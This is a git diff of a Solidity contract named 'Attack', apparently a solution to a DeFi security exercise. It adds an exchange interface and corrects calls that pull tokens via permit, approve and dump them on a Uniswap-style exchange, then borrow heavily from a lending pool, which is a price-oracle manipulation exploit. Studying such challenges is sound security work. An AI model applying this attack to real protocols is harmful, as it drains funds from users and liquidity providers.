@@ -4,6 +4,19 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/utils/Address.sol";
 import "hardhat/console.sol";
 
+interface IUniswap {
+    function tokenToEthSwapInput(
+        uint256 tokensSold,
+        uint256 minEth,
+        uint256 deadline
+    ) external returns (uint256);
+
+    function ethToTokenSwapInput(
+        uint256 minTokens,
+        uint256 deadline
+    ) external payable returns (uint256);
+}
+
 contract Attack {
     using Address for address;
 
@@ -36,7 +49,7 @@ contract Attack {
 
         tokenAddress.functionCall(
             abi.encodeWithSignature(
-                "permit",
+                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)",
                 msg.sender,
                 address(this),
                 tokenAmount,
@@ -46,26 +59,43 @@ contract Attack {
                 s
             )
         );
-        console.log("permit");
+
+        console.log("permit done");
 
         tokenAddress.functionCall(
             abi.encodeWithSignature(
-                "transferFrom",
+                "transferFrom(address,address,uint256)",
                 msg.sender,
                 address(this),
                 tokenAmount
             )
         );
-        console.log("transfer");
-        //swap token to eth
-        swapAddress.functionCall(
+        console.log("transfer done ");
+
+        tokenAddress.functionCall(
             abi.encodeWithSignature(
-                "tokenToEthSwapInput",
-                tokenAmount,
-                0,
-                deadline
+                "approve(address,uint256)",
+                swapAddress,
+                type(uint256).max
             )
         );
+        console.log("approve done");
+        //swap token to eth
+
+        // swapAddress.functionCall(
+        //     abi.encodeWithSignature(
+        //         "tokenToEthSwapInput(uint256,uint256,uint256)",
+        //         tokenAmount,
+        //         1,
+        //         deadline
+        //     )
+        // );
+        IUniswap(swapAddress).tokenToEthSwapInput(
+            tokenAmount,
+            1,
+            block.timestamp + 300
+        );
+        console.log("swap done");
         //borrow token
         poolAddress.functionCall(
             abi.encodeWithSignature("borrow", 10000 * 10 ** 18, msg.sender)
